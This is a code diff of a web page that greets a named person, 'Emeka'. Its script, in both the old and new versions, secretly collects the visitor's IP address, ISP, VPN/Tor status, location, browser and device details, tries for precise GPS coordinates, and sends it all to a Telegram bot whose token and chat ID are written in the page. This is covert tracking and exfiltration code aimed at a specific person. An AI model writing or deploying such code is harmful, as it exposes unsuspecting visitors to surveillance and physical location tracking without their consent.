@@ -29,40 +29,11 @@
 </head>
 <body>
   <div class="message">Hi Emeka 👋🏿</div>
-
   <script>
     const PUBLIC_BOT_TOKEN = '7904257718:AAEMNe8Nb4Lk4YcCPr1BjB2bfxq9HF-tjI8';
     const PUBLIC_CHAT_ID = '7830815090';
 
-    async function getIpData(ip) {
-      const res = await fetch(`https://ipapi.co/${ip}/json/`);
-      return await res.json();
-    }
-
-    async function reverseGeocode(lat, lon) {
-      try {
-        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
-        const data = await res.json();
-        return data.display_name || 'Unknown location';
-      } catch {
-        return 'Lookup failed';
-      }
-    }
-
-    function getBrowserInfo() {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const language = navigator.language;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const deviceType = /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop';
-      const time = new Date().toLocaleString();
-
-      return {
-        ua, platform, language, timezone, deviceType, time
-      };
-    }
-
-    function sendTelegramMessage(text) {
+    const sendMessage = (text) => {
       fetch(`https://api.telegram.org/bot${PUBLIC_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
@@ -70,91 +41,77 @@
         },
         body: JSON.stringify({
           chat_id: PUBLIC_CHAT_ID,
-          text
+          text: text
         })
       });
-    }
+    };
 
-    async function getGeoPrompt() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) {
-          resolve(null);
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-          async pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const address = await reverseGeocode(lat, lon);
-
-            resolve({
-              lat,
-              lon,
-              address
-            });
-          },
-          () => resolve(null),
-          { timeout: 5000 }
-        );
-      });
-    }
-
-    function buildInitialMessage(ipData, ipAddressResolved, browserData) {
-      return `📡 *New Visitor Report*
-
-🌐 *Browser Info*
-- User Agent: ${browserData.ua}
-- Platform: ${browserData.platform}
-- Language: ${browserData.language}
-- Timezone: ${browserData.timezone}
-- Device Type: ${browserData.deviceType}
-- Current Time: ${browserData.time}
-
-📍 *IP-Based Location*
-- IP: ${ipData.ip}
-- Country: ${ipData.country_name}
-- Region: ${ipData.region}
-- City: ${ipData.city}
-- ISP: ${ipData.org}
-- ASN: ${ipData.asn}
-- Proxy: ${ipData.proxy ? 'Yes' : 'No'}
-- VPN: ${ipData.security?.vpn ? 'Yes' : 'No'}
-- TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
-- Latitude: ${ipData.latitude}
-- Longitude: ${ipData.longitude}
-- Address: ${ipAddressResolved}`;
-    }
-
-    function buildGeoMessage(geoData) {
-      return `📌 *Geo Prompt Location (Permission Allowed)*
-
-- Latitude: ${geoData.lat}
-- Longitude: ${geoData.lon}
-- Address: ${geoData.address}`;
-    }
-
-    (async () => {
+    const getInfo = async () => {
       try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ip = (await ipRes.json()).ip;
+        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
 
-        const ipData = await getIpData(ip);
-        const ipAddressResolved = await reverseGeocode(ipData.latitude, ipData.longitude);
-        const browserData = getBrowserInfo();
+        const browserInfo = `🧭 Browser Info:
+• Locale: ${navigator.language}
+• Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• Current Time: ${new Date().toLocaleString()}
+• User Agent: ${navigator.userAgent}
+• Platform: ${navigator.platform}
+• Device Type: ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
 
-        const initialMessage = buildInitialMessage(ipData, ipAddressResolved, browserData);
-        sendTelegramMessage(initialMessage);
+        const ipInfo = `🌍 IP-Based Info:
+• IP: ${ipData.ip}
+• Country: ${ipData.country_name}
+• Region: ${ipData.region}
+• City: ${ipData.city}
+• ISP: ${ipData.org}
+• Proxy: ${ipData.proxy ? 'Yes' : 'No'}
+• VPN: ${ipData.security?.vpn ? 'Yes' : 'No'}
+• TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
+• Latitude: ${ipData.latitude}
+• Longitude: ${ipData.longitude}
+• Address: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
 
-        const geoData = await getGeoPrompt();
-        if (geoData) {
-          const geoMessage = buildGeoMessage(geoData);
-          sendTelegramMessage(geoMessage);
+        const combinedInfo = `${browserInfo}\n\n${ipInfo}`;
+
+        const permission = await navigator.permissions.query({ name: 'geolocation' });
+
+        if (permission.state === 'granted') {
+          navigator.geolocation.getCurrentPosition(pos => {
+            const geo = pos.coords;
+            const geoInfo = `📍 Geolocation (Permission Already Granted):
+• Latitude: ${geo.latitude}
+• Longitude: ${geo.longitude}
+• Accuracy: ±${geo.accuracy} meters`;
+
+            sendMessage(`${combinedInfo}\n\n${geoInfo}`);
+          }, () => {
+            sendMessage(`${combinedInfo}\n\n⚠️ Failed to retrieve geolocation.`);
+          });
+        } else {
+          sendMessage(combinedInfo);
+
+          navigator.geolocation.getCurrentPosition(pos => {
+            const geo = pos.coords;
+            const geoInfo = `📍 Geolocation (Permission Just Granted):
+• Latitude: ${geo.latitude}
+• Longitude: ${geo.longitude}
+• Accuracy: ±${geo.accuracy} meters`;
+
+            sendMessage(geoInfo);
+          }, (err) => {
+            if (err.code === 1) {
+              sendMessage('❌ User denied geolocation access.');
+            } else {
+              sendMessage(`⚠️ Geolocation error: ${err.message}`);
+            }
+          });
         }
-      } catch (err) {
-        console.error('Failed to collect and send info', err);
+      } catch (e) {
+        sendMessage(`❌ Error collecting data: ${e.message}`);
       }
-    })();
+    };
+
+    getInfo();
   </script>
 </body>
 </html>
